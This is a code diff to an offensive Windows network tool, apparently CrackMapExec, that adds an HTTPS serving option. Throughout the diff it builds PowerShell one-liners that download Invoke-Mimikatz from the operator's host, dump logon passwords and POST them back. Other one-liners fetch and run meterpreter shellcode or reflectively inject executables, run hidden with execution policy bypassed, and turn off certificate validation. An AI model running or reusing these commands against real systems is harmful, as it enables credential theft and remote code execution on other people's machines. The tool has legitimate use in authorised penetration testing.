@@ -38,6 +38,7 @@ import csv
 import re
 import ntpath
 import socket
+import ssl
 import hashlib
 import codecs
 import BaseHTTPServer
@@ -2686,22 +2687,9 @@ def enum_shares(smb):
 
     return permissions
 
-def ps_command(command=None, katz_ip=None, katz_command='privilege::debug sekurlsa::logonpasswords exit'):
-
-    if katz_ip:
-        command = """
-        IEX (New-Object Net.WebClient).DownloadString('http://{addr}/Invoke-Mimikatz.ps1');
-        $creds = Invoke-Mimikatz -Command "{katz_command}";
-        $request = [System.Net.WebRequest]::Create('http://{addr}');
-        $request.Method = "POST";
-        $request.ContentType = "application/x-www-form-urlencoded";
-        $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);
-        $request.ContentLength = $bytes.Length;
-        $requestStream = $request.GetRequestStream();
-        $requestStream.Write( $bytes, 0, $bytes.Length );
-        $requestStream.Close();
-        $request.GetResponse();
-        """.format(addr=katz_ip, katz_command=katz_command)
+def ps_command(command):
+    if args.ssl:
+        command = "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" + command
 
     if args.force_ps32:
         command = 'IEX "$Env:windir\\SysWOW64\\WindowsPowershell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}"'.format(b64encode(command.encode('UTF-16LE')))
@@ -2712,12 +2700,37 @@ def ps_command(command=None, katz_ip=None, katz_command='privilege::debug sekurl
 
     return ps_command
 
+def gen_mimikatz_command(localip, katz_command='privilege::debug sekurlsa::logonpasswords exit'):
+    protocol = 'http'
+    if args.ssl:
+        protocol = 'https'
+
+    command = """
+    IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}/Invoke-Mimikatz.ps1');
+    $creds = Invoke-Mimikatz -Command "{katz_command}";
+    $request = [System.Net.WebRequest]::Create('{protocol}://{addr}');
+    $request.Method = "POST";
+    $request.ContentType = "application/x-www-form-urlencoded";
+    $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);
+    $request.ContentLength = $bytes.Length;
+    $requestStream = $request.GetRequestStream();
+    $requestStream.Write( $bytes, 0, $bytes.Length );
+    $requestStream.Close();
+    $request.GetResponse();
+    """.format(protocol=protocol, addr=localip, katz_command=katz_command)
+
+    return ps_command(command)
+
 def inject_pscommand(localip):
+    protocol = 'http'
+    if args.ssl:
+        protocol = 'https'
 
     if args.inject.startswith('met_'):
         command = """
-        IEX (New-Object Net.WebClient).DownloadString('http://{}/Invoke-Shellcode.ps1');
-        Invoke-Shellcode -Force -Payload windows/meterpreter/{} -Lhost {} -Lport {}""".format(localip,
+        IEX (New-Object Net.WebClient).DownloadString('{}://{}/Invoke-Shellcode.ps1');
+        Invoke-Shellcode -Force -Payload windows/meterpreter/{} -Lhost {} -Lport {}""".format(protocol,
+                                                                                              localip,
                                                                                               args.inject[4:], 
                                                                                               args.met_options[0], 
                                                                                               args.met_options[1])
@@ -2728,10 +2741,12 @@ def inject_pscommand(localip):
 
     elif args.inject == 'shellcode':
         command = """
-        IEX (New-Object Net.WebClient).DownloadString('http://{addr}/Invoke-Shellcode.ps1');
+        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}/Invoke-Shellcode.ps1');
         $WebClient = New-Object System.Net.WebClient;
-        [Byte[]]$bytes = $WebClient.DownloadData('http://{addr}/{shellcode}');
-        Invoke-Shellcode -Force -Shellcode $bytes""".format(addr=localip, shellcode=args.path.split('/')[-1])
+        [Byte[]]$bytes = $WebClient.DownloadData('{protocol}://{addr}/{shellcode}');
+        Invoke-Shellcode -Force -Shellcode $bytes""".format(protocol=protocol,
+                                                            addr=localip,
+                                                            shellcode=args.path.split('/')[-1])
 
         if args.procid:
             command += " -ProcessID {}".format(args.procid)
@@ -2740,8 +2755,10 @@ def inject_pscommand(localip):
 
     elif args.inject == 'exe' or args.inject == 'dll':
         command = """
-        IEX (New-Object Net.WebClient).DownloadString('http://{addr}/Invoke-ReflectivePEInjection.ps1'); 
-        Invoke-ReflectivePEInjection -PEUrl http://{addr}/{pefile}""".format(addr=localip, pefile=args.path.split('/')[-1])
+        IEX (New-Object Net.WebClient).DownloadString('{protocol}://{addr}/Invoke-ReflectivePEInjection.ps1'); 
+        Invoke-ReflectivePEInjection -PEUrl {protocol}://{addr}/{pefile}""".format(protocol=protocol,
+                                                                                   addr=localip,
+                                                                                   pefile=args.path.split('/')[-1])
 
         if args.procid:
             command += " -ProcID {}"
@@ -2924,14 +2941,14 @@ def connect(host):
 
             if args.mimikatz:
                 noOutput = True
-                args.command = ps_command(katz_ip=local_ip)
+                args.command = gen_mimikatz_command(local_ip)
 
             if args.mimi_cmd:
                 noOutput = True
-                args.command = ps_command(katz_ip=local_ip, katz_command=args.mimi_cmd)
+                args.command = gen_mimikatz_command(local_ip, args.mimi_cmd)
 
             if args.pscommand:
-                args.command = ps_command(command=args.pscommand)
+                args.command = ps_command(args.pscommand)
 
             if args.inject:
                 noOutput = True
@@ -3029,6 +3046,7 @@ if __name__ == '__main__':
     parser.add_argument("-n", metavar='NAMESPACE', dest='namespace', default='//./root/cimv2', help='WMI Namespace (default //./root/cimv2)')
     parser.add_argument("-s", metavar="SHARE", dest='share', default="C$", help="Specify a share (default: C$)")
     parser.add_argument("--port", dest='port', type=int, choices={139, 445}, default=445, help="SMB port (default: 445)")
+    parser.add_argument("--https", dest='ssl', action='store_true', help='Serve everything over https instead of http')
     parser.add_argument("-v", action='store_true', dest='verbose', help="Enable verbose output")
     parser.add_argument("target", nargs=1, type=str, help="The target range, CIDR identifier or file containing targets")
 
@@ -3153,18 +3171,23 @@ if __name__ == '__main__':
             print_error('Unable to find combo file at specified path')
             sys.exit(1)
 
-    if args.mimikatz or args.mimi_cmd or args.inject or (args.ntds == 'ninja'):
+    if args.mimikatz or args.mimi_cmd or args.inject or args.ntds == 'ninja':
         print_status("Press CTRL-C at any time to exit")
         print_status('Note: This might take some time on large networks! Go grab a redbull!\n')
 
-        server = BaseHTTPServer.HTTPServer(('0.0.0.0', 80), MimikatzServer)
-        t = Thread(name='HTTPServer', target=server.serve_forever)
+        if args.ssl:
+            httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), MimikatzServer)
+            httpd.socket = ssl.wrap_socket(httpd.socket, certfile='certs/crackmapexec.crt', keyfile='certs/crackmapexec.key', server_side=True)
+        else:
+            httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 80), MimikatzServer)
+
+        t = Thread(name='HTTPServer', target=httpd.serve_forever)
         t.setDaemon(True)
         t.start()
 
     concurrency(hosts)
 
-    if args.mimikatz or args.inject or args.ntds == 'ninja':
+    if args.mimikatz or args.mimi_cmd or args.inject or args.ntds == 'ninja':
         try:
             while True:
                 sleep(1)
